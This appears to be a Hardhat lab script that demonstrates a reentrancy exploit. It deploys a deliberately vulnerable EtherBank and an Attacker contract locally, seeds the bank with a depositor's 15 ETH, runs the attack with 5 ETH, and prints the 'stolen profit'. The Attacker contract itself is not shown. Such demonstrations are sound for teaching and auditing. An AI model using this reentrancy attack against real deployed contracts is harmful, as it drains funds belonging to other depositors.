const { ethers } = require("hardhat");

function eth(wei) {
  return `${ethers.formatEther(wei)} ETH`;
}

async function main() {
  const [depositor, attacker] = await ethers.getSigners();

  console.log("=== Setup ===");
  console.log("Depositor:", depositor.address);
  console.log("Attacker :", attacker.address);

  const Bank = await ethers.getContractFactory("contracts/VulnerableBank.sol:EtherBank");
  const bank = await Bank.deploy();
  await bank.waitForDeployment();
  const bankAddress = await bank.getAddress();
  console.log("VulnerableBank deployed at:", bankAddress);

  const Attacker = await ethers.getContractFactory("Attacker");
  const attackerContract = await Attacker.connect(attacker).deploy(bankAddress);
  await attackerContract.waitForDeployment();
  console.log("Attacker contract deployed at:", await attackerContract.getAddress());

  // A legitimate depositor puts money in the bank first.
  await bank.connect(depositor).deposit({ value: ethers.parseEther("15") });

  const attackerEoaBalanceBefore = await ethers.provider.getBalance(attacker.address);

  console.log("\n=== Before attack ===");
  console.log("Bank balance          :", eth(await bank.getBalance()));
  console.log("Depositor's own funds  :", eth(await bank.balances(depositor.address)));
  console.log("Attacker EOA balance   :", eth(attackerEoaBalanceBefore));

  console.log("\n=== Attack transaction (deposit 5 ETH, then withdraw -> reenter) ===");
  const tx = await attackerContract.connect(attacker).attack({ value: ethers.parseEther("5") });
  const receipt = await tx.wait();
  const gasCost = receipt.gasUsed * receipt.gasPrice;

  console.log("\n=== After attack ===");
  console.log("Bank balance                 :", eth(await bank.getBalance()));
  console.log("Attacker contract balance    :", eth(await attackerContract.getBalance()));
  const attackerEoaBalanceAfter = await ethers.provider.getBalance(attacker.address);
  console.log("Attacker EOA balance         :", eth(attackerEoaBalanceAfter));
  console.log("Gas spent on the attack tx   :", eth(gasCost));

  const netChange = attackerEoaBalanceAfter - attackerEoaBalanceBefore;
  const profit = netChange + gasCost - ethers.parseEther("5"); // put in 5, ignore gas, then compare to what came back

  console.log("\n=== Net result ===");
  console.log("Attacker started with 5 ETH of their own and put it in.");
  console.log("Net wallet change (incl. gas):", eth(netChange));
  console.log("Stolen profit (excl. own 5 ETH, excl. gas):", eth(profit));
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
